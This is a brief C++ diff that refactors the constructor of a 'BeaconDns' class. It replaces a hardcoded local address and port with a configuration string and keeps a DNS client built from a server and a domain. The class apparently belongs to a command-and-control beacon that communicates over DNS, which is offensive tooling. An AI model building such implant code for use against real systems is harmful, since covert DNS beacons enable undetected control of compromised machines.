@@ -4,9 +4,12 @@ using namespace std;
 using namespace dns;
 
 
-BeaconDns::BeaconDns(const std::string& dnsServer, const std::string& domain)
-	: Beacon("127.0.0.1", 666)
+BeaconDns::BeaconDns(std::string& config, const std::string& dnsServer, const std::string& domain)
+	: Beacon()
 {
+	// beacon and modules config
+    initConfig(config);
+	
 	m_client=new Client(dnsServer, domain);
 }
 
